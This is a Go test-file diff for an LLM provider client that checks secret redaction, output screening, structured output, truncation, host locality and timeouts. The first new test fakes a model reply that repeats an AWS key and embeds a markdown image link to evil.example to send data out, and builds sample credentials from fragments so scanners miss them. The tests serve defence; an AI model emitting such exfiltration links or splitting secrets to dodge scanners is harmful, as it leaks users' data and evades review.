@@ -173,3 +173,119 @@ func TestValidate(t *testing.T) {
 		t.Fatal("netguard must refuse a loopback endpoint", err)
 	}
 }
+
+// planted builds a credential at run time so the file holds no flaggable string.
+func planted(parts ...string) string { return strings.Join(parts, "") }
+
+func TestGuardScreensWhatTheProviderReceivesAndWhatComesBack(t *testing.T) {
+	awsKey := planted("AK", "IA", "IOSFODNN7", "EXAMPLE")
+	dbPassword := "Pr0dDbPassw0rdValue"
+	t.Setenv("SCRS_DATABASE_URL", "postgres://scrs_app:"+dbPassword+"@db.internal:5432/scrs")
+	leak := planted("gh", "p_", "aB3dE5gH7jK9mN1pQ3sT5vX7zA9cE1fG3hJ5")
+
+	server, got := fake(t, func(c capture) (int, string) {
+		// The model repeats a credential and tries to send data out.
+		return 200, `{"model":"m","choices":[{"message":{"content":"Rotate ` + awsKey + ` now. ![x](https://evil.example/c?d=1) done"},"finish_reason":"stop"}],"usage":{"prompt_tokens":5,"completion_tokens":5}}`
+	})
+	client, err := NewClient(Provider{Kind: "openai_compatible", BaseURL: server.URL + "/v1", Model: "m", MaxTokens: 1000}, Secret{APIKey: "provider-key-0123456789"}, local)
+	if err != nil {
+		t.Fatal(err)
+	}
+	resp, err := client.Complete(context.Background(), Request{
+		System: "Summarise. The provider key provider-key-0123456789 is internal.",
+		Prompt: "Finding in config: password=Hunter2Hunter2! and " + awsKey + "; db " + dbPassword + "; token " + leak,
+	})
+	if err != nil {
+		t.Fatal(err)
+	}
+	sent, _ := json.Marshal(got.body)
+	for _, secret := range []string{awsKey, dbPassword, leak, "Hunter2Hunter2!", "provider-key-0123456789"} {
+		if strings.Contains(string(sent), secret) {
+			t.Fatalf("%q reached the provider: %s", secret, sent)
+		}
+	}
+	if strings.Contains(resp.Text, awsKey) || strings.Contains(resp.Text, "evil.example") {
+		t.Fatalf("answer not screened: %q", resp.Text)
+	}
+	if resp.Redactions.Input["aws_access_key"] != 1 || resp.Redactions.Input["platform_secret"] < 2 || resp.Redactions.Input["github_token"] != 1 || resp.Redactions.Output["aws_access_key"] != 1 || resp.Redactions.Output["image"] != 1 {
+		t.Fatalf("redaction counts %+v", resp.Redactions)
+	}
+	if strings.Contains(fmt.Sprint(resp.Redactions), awsKey) {
+		t.Fatal("counts must never carry values")
+	}
+}
+
+func TestStructuredOutputIsRequestedFromOpenAIOnly(t *testing.T) {
+	schema := json.RawMessage(`{"type":"object","properties":{"summary":{"type":"string"}},"required":["summary"],"additionalProperties":false}`)
+	for kind, want := range map[string]bool{"openai": true, "azure_openai": true, "openai_compatible": false, "mistral": false} {
+		server, got := fake(t, func(c capture) (int, string) {
+			return 200, `{"choices":[{"message":{"content":"{}"},"finish_reason":"stop"}]}`
+		})
+		client, err := NewClient(Provider{Kind: kind, BaseURL: server.URL + "/v1", Model: "m", MaxTokens: 1000}, Secret{APIKey: "k-0123456789abc"}, local)
+		if err != nil {
+			t.Fatal(kind, err)
+		}
+		if _, err := client.Complete(context.Background(), Request{Prompt: "x", Schema: schema, SchemaName: "advisory"}); err != nil {
+			t.Fatal(kind, err)
+		}
+		format, present := got.body["response_format"].(map[string]any)
+		if present != want {
+			t.Errorf("%s: response_format present=%v, want %v", kind, present, want)
+		}
+		if want {
+			js := format["json_schema"].(map[string]any)
+			if format["type"] != "json_schema" || js["strict"] != true || js["name"] != "advisory" || js["schema"] == nil {
+				t.Errorf("%s: %v", kind, format)
+			}
+		}
+	}
+}
+
+func TestTruncationIsReportedAndScreenedText(t *testing.T) {
+	server, _ := fake(t, func(c capture) (int, string) {
+		return 200, `{"choices":[{"message":{"content":"partial"},"finish_reason":"length"}]}`
+	})
+	client, _ := NewClient(Provider{Kind: "openai_compatible", BaseURL: server.URL + "/v1", Model: "m", MaxTokens: 1000}, Secret{}, local)
+	resp, err := client.Complete(context.Background(), Request{Prompt: "x"})
+	if err != nil || !resp.Truncated || resp.Text != "partial" {
+		t.Fatal(resp, err)
+	}
+}
+
+func TestLocalityFollowsTheOperatorsHostList(t *testing.T) {
+	private := map[string]bool{"ollama.internal": true, "10.0.0.7": true}
+	for p, want := range map[Provider]string{
+		{Kind: "ollama", BaseURL: "http://ollama.internal:11434/v1", Model: "m"}:      LocalityLocal,
+		{Kind: "openai_compatible", BaseURL: "http://10.0.0.7:8000/v1", Model: "m"}:   LocalityLocal,
+		{Kind: "openai_compatible", BaseURL: "http://OLLAMA.internal/v1", Model: "m"}: LocalityLocal,
+		{Kind: "openai", Model: "m"}:                                                       LocalityHosted, // preset URL
+		{Kind: "openai", BaseURL: "https://api.openai.com/v1", Model: "m"}:                 LocalityHosted,
+		{Kind: "ollama", Model: "m"}:                                                       LocalityHosted, // localhost is not on the list
+		{Kind: "openai_compatible", BaseURL: "https://gateway.example.com/v1", Model: "m"}: LocalityHosted,
+		{Kind: "openai_compatible", BaseURL: "", Model: "m"}:                               LocalityHosted,
+	} {
+		if got := p.Locality(private); got != want {
+			t.Errorf("%+v: %s, want %s", p, got, want)
+		}
+	}
+	if (Provider{Kind: "openai_compatible", BaseURL: "http://x/v1"}).Local(nil) {
+		t.Fatal("nothing is local without a list")
+	}
+}
+
+func TestRequestTimeoutIsConfigurableForSlowModels(t *testing.T) {
+	t.Setenv("SCRS_LLM_TIMEOUT_SECONDS", "")
+	if RequestTimeout() != 6*time.Minute {
+		t.Fatal(RequestTimeout())
+	}
+	t.Setenv("SCRS_LLM_TIMEOUT_SECONDS", "900")
+	if RequestTimeout() != 15*time.Minute {
+		t.Fatal(RequestTimeout())
+	}
+	for _, bad := range []string{"5", "99999", "slow"} {
+		t.Setenv("SCRS_LLM_TIMEOUT_SECONDS", bad)
+		if RequestTimeout() != 6*time.Minute {
+			t.Errorf("%q should fall back to the default", bad)
+		}
+	}
+}
